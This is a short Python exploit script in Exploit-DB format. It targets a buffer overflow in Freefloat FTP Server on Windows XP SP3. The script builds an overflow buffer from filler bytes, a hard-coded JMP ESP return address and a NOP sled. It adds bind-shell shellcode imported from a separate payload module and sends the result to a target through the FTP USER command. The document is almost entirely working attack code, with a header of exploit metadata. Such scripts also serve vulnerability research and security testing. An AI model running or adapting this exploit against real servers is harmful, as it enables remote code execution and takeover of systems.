# Exploit Title: Freefloat FTP Server Buffer Overflow Vulnerability
# Date: 12/05/2010
# Author: 0v3r
# Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
# Tested on: Windows XP SP3 EN
# CVE: N/A

#!/usr/bin/python
from time import sleep
from payload import buf
import socket
import struct
import os
def shell_attack(target_machine, target_port):

     

#Bind Shell shellcode port 4444
	

	junk1  = b"\x41" * 230
	eip    = b"\x53\x93\x42\x7E"  #7E429353 JMP ESP
	nops   = b"\x90" * 16
	junk2  = b"\x43" * (1000 - len(junk1 + eip + nops + buf))

	buff   = junk1 + eip + nops + buf + junk2 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_machine,target_port))
	data = s.recv(1024)

	s.send(b'USER ' + buff + b'\r\n')
	s.close()

	